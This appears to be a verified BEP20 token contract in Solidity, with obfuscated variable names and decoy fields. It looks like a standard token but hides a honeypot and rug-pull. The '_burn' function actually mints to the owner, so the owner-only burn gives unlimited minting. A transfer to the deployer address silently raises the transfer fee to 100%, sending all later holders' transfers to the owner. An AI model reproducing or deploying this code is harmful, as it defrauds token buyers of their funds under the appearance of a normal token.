/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13 23:00 GMT
 */
pragma solidity >=0.4.11;
contract eAsCcM {
address public  EjiTjX = address(0);
address public  qLQgaH = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
uint256 public  UbpMqB = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  mpqZOv = address(0);
uint256 public  EExeYp = 10000000000000000000;
uint256 public  qSyYVS = 100000000000000000000000;
address public  rLCMeG = address(0);
address public  PdmmjS = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant NxIXgt = 9+1;
address private  OfuehG = address(0);
address public  uyzNjn = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
string public  name = "YQKjxx";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "NjRKFE";
uint256 public  dbHtJT = 100000000000000000000000;
uint256 public  wudJOf = 100000000000000000;
uint256 public  HXYtak = 10000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 private  NRVOfP = 10000000000000;
uint256 public  GWNFFr = 1000000000000000000;
uint256 public  WqpNAJ = 10000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
OfuehG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MLVSLM");
require(to != address(0), "MLVSLM");
require(amount <= balanceOf[from], "MLVSLM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NxIXgt/NRVOfP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OfuehG){
NRVOfP = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}